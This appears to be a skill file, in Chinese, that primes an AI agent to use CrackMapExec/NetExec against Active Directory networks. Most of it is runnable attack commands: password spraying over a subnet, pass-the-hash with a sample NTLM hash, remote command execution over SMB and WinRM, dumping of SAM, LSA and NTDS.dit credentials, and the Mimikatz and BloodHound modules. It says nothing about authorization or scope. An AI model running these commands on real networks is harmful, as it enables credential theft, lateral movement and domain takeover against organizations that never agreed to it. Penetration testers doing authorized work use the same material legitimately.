---
name: crackmapexec
description: >
  此技能适用于用户询问关于"crackmapexec"、"在 AD 中喷射凭据"、"枚举 SMB 共享"、
  "远程执行命令"、"转储 SAM/LSA/NTDS"、"映射 Active Directory 环境"等问题。
  AD 环境的瑞士军刀——通过 SMB/WinRM/LDAP 进行横向移动 (Lateral Movement)、凭据喷射、
  共享枚举和远程代码执行。
---

# CrackMapExec / NetExec (nxc)

AD 后渗透多功能工具——通过 SMB/WinRM/LDAP 进行喷射、枚举、执行和转储。

> **注意**：CrackMapExec (cme) 已停止维护。请使用 **NetExec** (`nxc`)——语法相同，仍在积极维护。

## 快速开始

```bash
# Check connectivity + SMB signing
nxc smb 192.168.1.0/24

# Credential validation
nxc smb 192.168.1.10 -u admin -p Password123

# Enumerate shares
nxc smb 192.168.1.10 -u admin -p Password123 --shares
```

## 支持协议

`smb`, `winrm`, `ldap`, `mssql`, `ssh`, `rdp`, `ftp`, `vnc`

## 核心参数

| 参数 | 描述 |
|------|-------------|
| `-u <user>` | 用户名或用户名列表 |
| `-p <pass>` | 密码或密码列表 |
| `-H <hash>` | NTLM 哈希（哈希传递） |
| `--local-auth` | 使用本地账户认证 |
| `-d <domain>` | 域名 |
| `-k` | 使用 Kerberos 认证 |
| `--continue-on-success` | 找到有效凭据后不停止 |
| `-x <cmd>` | 执行命令（cmd.exe） |
| `-X <cmd>` | 执行 PowerShell 命令 |
| `--exec-method <m>` | 执行方法：`wmiexec,smbexec,atexec,mmcexec` |
| `--shares` | 枚举共享 |
| `--users` | 枚举域用户 |
| `--groups` | 枚举域组 |
| `--computers` | 枚举域计算机 |
| `--loggedon-users` | 显示已登录用户 |
| `--sessions` | 显示活动会话 |
| `--sam` | 转储 SAM 哈希 |
| `--lsa` | 转储 LSA 机密 |
| `--ntds` | 转储 NTDS.dit（仅限 DC） |
| `-M <module>` | 加载模块 |
| `--pass-pol` | 获取密码策略 |
| `--rid-brute` | RID 暴力枚举用户 |

## 常见工作流程

```bash
# Password spray across subnet (continue on success)
nxc smb 192.168.1.0/24 -u users.txt -p "Summer2024!" --continue-on-success

# Pass-the-hash
nxc smb 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117 --local-auth

# Remote command execution
nxc smb 192.168.1.10 -u admin -p Password123 -x "whoami /all"

# Enumerate shares + readable content
nxc smb 192.168.1.10 -u admin -p Password123 --shares

# SAM dump (local admin required)
nxc smb 192.168.1.10 -u admin -p Password123 --sam

# NTDS dump (domain controller, DA required)
nxc smb <DC_IP> -u admin -p Password123 --ntds

# Execute with WinRM
nxc winrm 192.168.1.10 -u admin -p Password123 -x "ipconfig /all"

# LDAP: enumerate AD users
nxc ldap 192.168.1.10 -u admin -p Password123 --users
```

## 常用模块

```bash
# Mimikatz (requires admin)
nxc smb 192.168.1.10 -u admin -p Password123 -M mimikatz

# BloodHound data collection
nxc ldap <DC_IP> -u admin -p Password123 -M bloodhound

# WebDAV check
nxc smb 192.168.1.0/24 -M webdav

# Printer nightmare check
nxc smb 192.168.1.0/24 -M printnightmare

# Check for GPP passwords
nxc smb 192.168.1.0/24 -u admin -p Password123 -M gpp_password
```

## 参考资源

| 文件 | 加载时机 |
|------|--------------|
| `references/modules.md` | 完整模块列表、模块专用参数、输出解析 |
